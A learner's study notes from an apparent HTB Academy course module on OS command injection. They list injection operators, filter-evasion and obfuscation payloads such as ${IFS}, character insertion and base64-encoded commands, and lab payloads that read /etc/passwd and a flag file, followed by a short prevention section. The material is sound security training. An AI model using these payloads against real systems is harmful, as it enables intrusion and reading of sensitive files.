# 22 — Command Injections

> **Path Phase:** Web Attacks | **Difficulty:** Medium | **Sections:** 12

Detecting and exploiting OS command injection, with heavy focus on bypassing filters and blacklists.

> ℹ️ `{TARGET}` = target. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Intro to Command Injections
2. Detection
3. Injecting Commands
4. Other Injection Operators
5. Identifying Filters
6. Bypassing Space Filters
7. Bypassing Other Blacklisted Characters
8. Bypassing Blacklisted Commands
9. Advanced Command Obfuscation
10. Evasion Tools
11. Command Injection Prevention
12. Skills Assessment

---

## 1–4 — Detection & Injection Operators
Occurs when user input is passed to a system shell.
```bash
# Append to a legit input (like an IP):
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 || id
127.0.0.1 %0a id        # newline
`id`                     # backticks
$(id)                    # subshell
```
> **Basic injection:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 5 — Identifying Filters
Blacklists may block spaces, `;`, `|`, `/`, or command names. Test each to see what's rejected.

## 6 — Bypassing Space Filters
```bash
{ls,-la}                 # brace expansion
cat</etc/passwd          # redirect
%09                      # tab (URL-encoded)
${IFS}                   # internal field separator
cat$IFS$9/etc/passwd
```

## 7 — Bypassing Blacklisted Characters
```bash
${PATH:0:1}              # yields "/"
${LS_COLORS:10:1}        # yields ";"
```

## 8 — Bypassing Blacklisted Commands
```bash
w'h'o'am'i
w"h"o"am"i
wh\o\am\i
who$@ami
```

## 9 — Advanced Command Obfuscation
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")   # case manipulation
$(rev<<<'imaohw')                   # reversed command
bash<<<$(base64 -d<<<d2hvYW1p)      # base64 encoded
```

## 10 — Evasion Tools
```bash
./bashfuscator -c 'cat /etc/passwd'
```

## 11 — Prevention
Avoid shell calls with user input; use parameterized APIs, input whitelisting, least privilege.

## 12 — Skills Assessment
```bash
127.0.0.1; whoami
# Identify filters, then craft bypass:
127.0.0.1%0acat${IFS}/flag.txt
127.0.0.1%0ac\at${IFS}${PATH:0:1}flag.txt
```
> **Skills Assessment:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| Burp Suite | Injecting & URL-encoding payloads |
| `bashfuscator` | Automated command obfuscation |
| Manual bypasses | `${IFS}`, brace expansion, char insertion |

## 🔑 Key Takeaways
- Injection operators: `;`, `&&`, `|`, `||`, `` ` ``, `$()`, `%0a`.
- `${IFS}` and `{cmd,arg}` bypass space filters.
- Character insertion (`w'h'o'ami`) bypasses command blacklists.
- URL-encode payloads (`%0a`, `%09`) when injecting via web params.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
